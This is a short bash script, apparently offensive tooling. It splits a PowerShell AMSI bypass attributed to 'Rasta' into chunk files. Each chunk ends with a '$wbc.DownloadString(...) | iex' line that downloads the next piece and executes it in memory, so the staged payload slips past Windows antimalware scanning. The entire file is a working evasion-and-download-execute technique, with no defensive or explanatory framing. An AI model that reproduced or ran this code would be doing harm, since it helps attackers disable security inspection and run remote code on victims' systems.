#!/bin/bash

# Chunk Rasta's AMSI bypass to 8 pieces

head -n 1 $AMSIBYPASS_PS_PATH >> $AMSIBYPASS_PS_PATH.chunked.b1
sed -n '2,3p' $AMSIBYPASS_PS_PATH >> $AMSIBYPASS_PS_PATH.chunked.b1
echo '"@' >> $AMSIBYPASS_PS_PATH.chunked.b1
echo '$a = @"' >> $AMSIBYPASS_PS_PATH.chunked.b1
sed -n '4,6p' $AMSIBYPASS_PS_PATH >> $AMSIBYPASS_PS_PATH.chunked.b1
echo '"@' >> $AMSIBYPASS_PS_PATH.chunked.b1
echo '$wbc.DownloadString($c12) | iex' >> $AMSIBYPASS_PS_PATH.chunked.b1
echo '$b = @"' >> $AMSIBYPASS_PS_PATH.chunked.c12
sed -n '7,8p' $AMSIBYPASS_PS_PATH >> $AMSIBYPASS_PS_PATH.chunked.c12
echo '"@' >> $AMSIBYPASS_PS_PATH.chunked.c12
echo '$wbc.DownloadString($c13) | iex' >> $AMSIBYPASS_PS_PATH.chunked.c12
echo '$c = @"' >> $AMSIBYPASS_PS_PATH.chunked.c13
sed -n '9,10p' $AMSIBYPASS_PS_PATH >> $AMSIBYPASS_PS_PATH.chunked.c13
echo '}' >> $AMSIBYPASS_PS_PATH.chunked.c13
echo '"@' >> $AMSIBYPASS_PS_PATH.chunked.c13
echo $(head -n 1 $AMSIBYPASS_PS_PATH | cut -d " " -f1)' = '$(head -n 1 $AMSIBYPASS_PS_PATH | cut -d " " -f1)' + $a + $b + $c;' >> $AMSIBYPASS_PS_PATH.chunked.c13
echo '$wbc.DownloadString($b2) | iex' >> $AMSIBYPASS_PS_PATH.chunked.c13
sed -n '13,16p' $AMSIBYPASS_PS_PATH > $AMSIBYPASS_PS_PATH.chunked.b2
echo '$wbc.DownloadString($b3) | iex' >> $AMSIBYPASS_PS_PATH.chunked.b2
sed -n '17,18p' $AMSIBYPASS_PS_PATH > $AMSIBYPASS_PS_PATH.chunked.b3
echo '$wbc.DownloadString($b4) | iex' >> $AMSIBYPASS_PS_PATH.chunked.b3
sed -n '19,21p' $AMSIBYPASS_PS_PATH > $AMSIBYPASS_PS_PATH.chunked.b4
echo '$wbc.DownloadString($b5) | iex' >> $AMSIBYPASS_PS_PATH.chunked.b4
sed -n '22,24p' $AMSIBYPASS_PS_PATH > $AMSIBYPASS_PS_PATH.chunked.b5
echo '$wbc.DownloadString($b6) | iex' >> $AMSIBYPASS_PS_PATH.chunked.b5
sed -n '25,30p' $AMSIBYPASS_PS_PATH > $AMSIBYPASS_PS_PATH.chunked.b6